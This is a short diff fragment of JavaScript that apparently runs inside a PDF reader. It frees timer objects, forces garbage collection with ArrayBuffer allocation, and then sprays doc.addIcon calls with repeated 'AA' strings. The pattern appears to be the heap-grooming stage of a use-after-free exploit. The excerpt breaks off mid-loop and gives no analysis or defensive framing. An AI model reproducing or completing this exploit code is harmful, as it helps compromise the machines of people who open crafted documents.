+    for (var i=0; i<array.length; i++) {
+      for (var j=0; j<array[i].length; j++) {
+        app.clearTimeOut(array[i][j]);
+      }
+    }
+
+    // Trigger the Garbage Collection
+    array.length = 0;
+    array.push(new ArrayBuffer(1024*1024));
+    array.length=0;
+    array.length=1024*4;
+    var str = 'AA';
+    for (var i = 0; i < array.length ; i++) {
+      for (var j = 0; j < 10; j++ ) {
+        doc.addIcon(str + "-" + str + str + str + str + str, doc.icons);
